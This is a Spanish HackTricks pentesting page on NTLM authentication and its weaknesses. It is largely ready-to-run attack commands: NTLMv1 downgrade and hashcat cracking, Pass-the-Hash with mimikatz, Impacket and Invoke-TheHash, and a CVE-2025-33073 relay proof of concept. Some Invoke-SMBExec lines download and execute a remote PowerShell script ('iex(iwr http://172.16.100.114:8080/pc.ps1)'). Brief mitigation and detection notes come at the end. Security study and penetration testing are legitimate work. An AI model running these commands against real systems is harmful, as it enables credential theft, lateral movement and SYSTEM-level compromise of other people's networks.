# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Información básica

En entornos donde están en operación **Windows XP y Server 2003**, se utilizan hashes LM (Lan Manager), aunque se reconoce ampliamente que estos pueden comprometerse fácilmente. Un hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica una situación en la que LM no se emplea, representando el hash de una cadena vacía.

Por defecto, el protocolo de autenticación **Kerberos** es el método principal utilizado. NTLM (NT LAN Manager) entra en juego bajo circunstancias específicas: ausencia de Active Directory, inexistencia del dominio, fallo de Kerberos debido a una configuración incorrecta, o cuando los intentos de conexión se realizan usando una dirección IP en lugar de un hostname válido.

La presencia del encabezado **"NTLMSSP"** en los paquetes de red indica un proceso de autenticación NTLM.

El soporte para los protocolos de autenticación - LM, NTLMv1 y NTLMv2 - está facilitado por una DLL específica ubicada en `%windir%\Windows\System32\msv1\_0.dll`.

**Puntos clave**:

- Los hashes LM son vulnerables y un hash LM vacío (`AAD3B435B51404EEAAD3B435B51404EE`) significa que no se usan.
- Kerberos es el método de autenticación por defecto, con NTLM usado solo bajo ciertas condiciones.
- Los paquetes de autenticación NTLM se identifican por el encabezado "NTLMSSP".
- Los protocolos LM, NTLMv1 y NTLMv2 son compatibles con el archivo del sistema `msv1\_0.dll`.

## LM, NTLMv1 y NTLMv2

Puedes comprobar y configurar qué protocolo se usará:

### GUI

Ejecuta _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Hay 6 niveles (de 0 a 5).

![](<../../images/image (919).png>)

### Registry

Esto establecerá el nivel 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores posibles:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticación de dominio NTLM

1. El **user** introduce sus **credentials**
2. La máquina cliente **envía una solicitud de autenticación** enviando el **domain name** y el **username**
3. El **server** envía el **challenge**
4. El **client encrypts** el **challenge** usando el hash de la password como key y lo envía como respuesta
5. El **server sends** al **Domain controller** el **domain name**, el **username**, el **challenge** y la **response**. Si **no hay** un Active Directory configurado o el domain name es el nombre del server, las credentials se **comprueban localmente**.
6. El **domain controller checks if everything is correct** y envía la información al server

El **server** y el **Domain Controller** son capaces de crear un **Secure Channel** vía el server **Netlogon** ya que el Domain Controller conoce la password del server (está dentro de la db **NTDS.DIT**).

### Esquema de autenticación NTLM local

La autenticación es la misma mencionada **before but** el **server** conoce el **hash of the user** que intenta autenticarse dentro del archivo **SAM**. Así que, en lugar de preguntarle al Domain Controller, el **server will check itself** si el user puede autenticarse.

### Desafío NTLMv1

La **challenge length is 8 bytes** y la **response is 24 bytes** de largo.

El **hash NT (16bytes)** se divide en **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): la **última parte se rellena con ceros**. Luego, el **challenge** se **ciphered separately** con cada parte y los bytes **resulting** se **joined**. Total: 8B + 8B + 8B = 24Bytes.

**Problemas**:

- Falta de **randomness**
- Las 3 partes pueden ser **atacadas por separado** para encontrar el NT hash
- **DES is crackable**
- La 3º key está compuesta siempre por **5 zeros**.
- Dado el **same challenge** la **response** será **same**. Así que puedes dar como **challenge** a la víctima la cadena "**1122334455667788**" y atacar la response usando **precomputed rainbow tables**.

### Ataque NTLMv1

Hoy en día es cada vez menos común encontrar entornos con Unconstrained Delegation configurado, pero esto no significa que no puedas **abuse a Print Spooler service** configurado.

Podrías abusar de algunas credentials/sessions que ya tienes en el AD para **pedirle a la impresora que se autentique** contra algún **host under your control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder` puedes **set the authentication challenge to 1122334455667788**, capturar el intento de autenticación y, si se hizo usando **NTLMv1**, podrás **crack it**.\
Si estás usando `responder` podrías intentar **use the flag `--lm`** para intentar **downgrade** la **authentication**.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

Recuerda que la impresora usará la cuenta del computer durante la autenticación, y las computer accounts usan **long and random passwords** que **probably won't be able to crack** usando **dictionaries** comunes. Pero la autenticación **NTLMv1** **uses DES** ([more info here](#ntlmv1-challenge)), así que usando algunos servicios especialmente dedicados a crackear DES podrás romperla (por ejemplo, podrías usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com)).

### Ataque NTLMv1 con hashcat

NTLMv1 también puede romperse con la NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formatea mensajes NTLMv1 de una manera que puede ser rota con hashcat.

El command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
produciría la salida siguiente:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Crea un archivo con el contenido de:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Ejecuta hashcat (lo mejor es de forma distribuida mediante una herramienta como hashtopolis) ya que, de lo contrario, esto tomará varios días.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
En este caso sabemos que la contraseña para esto es password, así que vamos a hacer trampa con fines de demostración:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ahora necesitamos usar las hashcat-utilities para convertir las claves des crackeadas en partes del hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Por fin la última parte:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Combínalos juntos:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

La **longitud del challenge es de 8 bytes** y se envían **2 responses**: una mide **24 bytes** y la longitud de la **otra** es **variable**.

**La primera response** se crea cifrando con **HMAC_MD5** la **string** compuesta por el **client y el domain** y usando como **key** el **hash MD4** del **NT hash**. Luego, el **result** se usará como **key** para cifrar con **HMAC_MD5** el **challenge**. A esto se le añadirá **un client challenge de 8 bytes**. Total: 24 B.

**La segunda response** se crea usando **varios valores** (un nuevo client challenge, un **timestamp** para evitar **replay attacks**...)

Si tienes un **pcap que haya capturado un proceso de autenticación exitoso**, puedes seguir esta guía para obtener el domain, username, challenge y response e intentar crackear la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Una vez que tienes el hash de la víctima**, puedes usarlo para **impersonate**.\
Necesitas usar una **tool** que **realice** la **NTLM authentication usando** ese **hash**, **o** puedes crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, para que cuando se realice cualquier **NTLM authentication**, se use **ese hash**. La última opción es lo que hace mimikatz.

**Por favor, recuerda que también puedes realizar ataques Pass-the-Hash usando Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Esto iniciará un proceso que pertenecerá a los usuarios que lanzaron mimikatz, pero internamente en LSASS las credenciales guardadas son las que están dentro de los parámetros de mimikatz. Entonces, puedes acceder a recursos de red como si fueras ese usuario (similar al truco `runas /netonly`, pero sin necesidad de conocer la contraseña en texto plano).

### Pass-the-Hash desde linux

Puedes obtener ejecución de código en máquinas Windows usando Pass-the-Hash desde Linux.\
[**Accede aquí para aprender cómo hacerlo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Puedes descargar[ los binarios de impacket para Windows aquí](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (En este caso necesitas especificar un comando, cmd.exe y powershell.exe no son válidos para obtener una shell interactiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Hay varios binarios más de Impacket...

### Invoke-TheHash

Puedes obtener los scripts de powershell desde aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta función es una **mezcla de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que quieras usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **cualquiera** de **SMBExec** y **WMIExec** pero **no** proporcionas ningún parámetro _**Command**_ simplemente **comprobará** si tienes **permisos suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Necesita ejecutarse como administrador**

Esta herramienta hará lo mismo que mimikatz (modificar la memoria de LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ejecución remota manual de Windows con nombre de usuario y contraseña


{{#ref}}
../lateral-movement/
{{#endref}}

## Extrayendo credenciales de un host Windows

**Para más información sobre** [**cómo obtener credenciales de un host Windows deberías leer esta página**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Ataque Internal Monologue

El Internal Monologue Attack es una técnica sigilosa de extracción de credenciales que permite a un atacante recuperar hashes NTLM de la máquina de una víctima **sin interactuar directamente con el proceso LSASS**. A diferencia de Mimikatz, que lee hashes directamente de la memoria y a menudo es bloqueado por soluciones de seguridad endpoint o Credential Guard, este ataque aprovecha **llamadas locales al paquete de autenticación NTLM (MSV1_0) a través de la Security Support Provider Interface (SSPI)**. Primero, el atacante **degrada la configuración de NTLM** (por ejemplo, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para asegurar que se permita NetNTLMv1. Después, suplanta tokens de usuario existentes obtenidos de procesos en ejecución y provoca la autenticación NTLM localmente para generar respuestas NetNTLMv1 usando un challenge conocido.

Tras capturar estas respuestas NetNTLMv1, el atacante puede recuperar rápidamente los hashes NTLM originales mediante **precomputed rainbow tables**, habilitando además ataques Pass-the-Hash para lateral movement. Fundamentalmente, el Internal Monologue Attack sigue siendo sigiloso porque no genera tráfico de red, no inyecta código ni desencadena volcado directo de memoria, lo que dificulta su detección para los defensores en comparación con métodos tradicionales como Mimikatz.

Si NetNTLMv1 no es aceptado —debido a políticas de seguridad aplicadas—, entonces el atacante puede no conseguir recuperar una respuesta NetNTLMv1.

Para manejar este caso, la herramienta Internal Monologue fue actualizada: adquiere dinámicamente un token de servidor usando `AcceptSecurityContext()` para seguir pudiendo **capturar respuestas NetNTLMv2** si falla NetNTLMv1. Aunque NetNTLMv2 es mucho más difícil de crackear, todavía abre una vía para relay attacks o brute-force offline en casos limitados.

El PoC se puede encontrar en **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay y Responder

**Lee aquí una guía más detallada sobre cómo realizar esos ataques:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsear challenges NTLM desde una captura de red

**Puedes usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* vía SPNs serializados (CVE-2025-33073)

Windows contiene varias mitigaciones que intentan evitar ataques de *reflection* donde una autenticación NTLM (o Kerberos) que se origina en un host se reenvía de vuelta al **mismo** host para obtener privilegios SYSTEM.

Microsoft rompió la mayoría de las cadenas públicas con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) y parches posteriores, sin embargo **CVE-2025-33073** muestra que las protecciones aún pueden eludirse abusando de cómo el **SMB client trunca los Service Principal Names (SPNs)** que contienen target-info *marshalled* (serializado).

### TL;DR del bug
1. Un atacante registra un **DNS A-record** cuyo label codifica un SPN *marshalled* — por ejemplo
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La víctima es forzada a autenticarse en ese hostname (PetitPotam, DFSCoerce, etc.).
3. Cuando el SMB client pasa la cadena objetivo `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la llamada a `CredUnmarshalTargetInfo` **elimina** el blob serializado, dejando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (o el equivalente de Kerberos) ahora considera que el objetivo es *localhost* porque la parte corta del host coincide con el nombre del equipo (`SRV1`).
5. En consecuencia, el servidor establece `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inyecta el **access-token SYSTEM de LSASS** en el contexto (para Kerberos se crea una subsession key marcada como SYSTEM).
6. Reenviar esa autenticación con `ntlmrelayx.py` **o** `krbrelayx.py` da derechos SYSTEM completos en el mismo host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* El parche KB para **CVE-2025-33073** añade una comprobación en `mrxsmb.sys::SmbCeCreateSrvCall` que bloquea cualquier conexión SMB cuyo target contenga info marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Fuerza **SMB signing** para prevenir reflection incluso en hosts sin parche.
* Monitoriza registros DNS que se parezcan a `*<base64>...*` y bloquea vectores de coercion (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Capturas de red con `NTLMSSP_NEGOTIATE_LOCAL_CALL` donde la IP del client ≠ IP del server.
* Kerberos AP-REQ que contenga una subsession key y un client principal igual al hostname.
* Windows Event 4624/4648 SYSTEM logons inmediatamente seguidos por remote SMB writes desde el mismo host.

Para la variante de local reflection de **March 2026** que abusa de **SMB arbitrary ports** y **TCP connection reuse** para llegar a `NT AUTHORITY\SYSTEM`, consulta:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
